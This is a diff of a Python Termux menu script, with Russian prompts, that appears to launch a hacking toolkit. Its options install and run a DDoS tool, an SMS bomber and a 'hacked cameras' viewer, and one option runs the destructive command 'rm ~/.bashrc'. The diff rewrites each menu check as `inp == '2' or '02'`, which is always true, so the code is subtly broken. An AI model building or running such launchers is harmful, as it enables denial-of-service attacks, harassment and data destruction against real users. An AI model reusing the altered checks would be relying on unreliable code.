@@ -102,7 +102,7 @@ while True:
             os.system('clear')
      
 
-    if inp == '2':   
+    if inp == '2' or '02':
         os.system('clear')
         print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru_201 = input('\n Включили? [y/n] >>> ')
@@ -167,7 +167,7 @@ while True:
 
 
 
-    if inp == '3':   
+    if inp == '3' or '03':
         os.system('clear')
         print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru_301 = input('\n Включили? [y/n] >>> ')
@@ -190,7 +190,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '4':    
+    if inp == '4' or '04':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка ддос...")
         res()
         time.sleep(1.5)
@@ -211,7 +211,7 @@ while True:
         os.system('python doser.py && python3 tool.py')
 
 
-    if inp == '5':
+    if inp == '5' or '05':
         os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка бомбер...")
         res()
@@ -223,7 +223,7 @@ while True:
         os.system('bomber')
 
 
-    if inp == '6':   
+    if inp == '6' or '06':
         tt = 'привет'
         os.system('clear')
         os.system('rm ~/.bashrc')
@@ -279,7 +279,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '7':
+    if inp == '7' or '07':
         os.system('clear')
         print(Fore.RED+'[ВЫ УВЕРЕНЫ ЧТО ХОТИТЕ ЗАБЛОКИРОВАТЬ Termux?]')
         res()
@@ -299,7 +299,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '8':    
+    if inp == '8' or '08':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка взломаных камер...")
         res()
         time.sleep(1.5)
@@ -315,7 +315,7 @@ while True:
         tsu_801 = input('[нажмите entr чтобы выйти]')
 
 
-    if inp == '9':
+    if inp == '9' or '09':
         os.system('clear')
         print(Fore.GREEN+'[Генерируется ссылка...]')
         res()
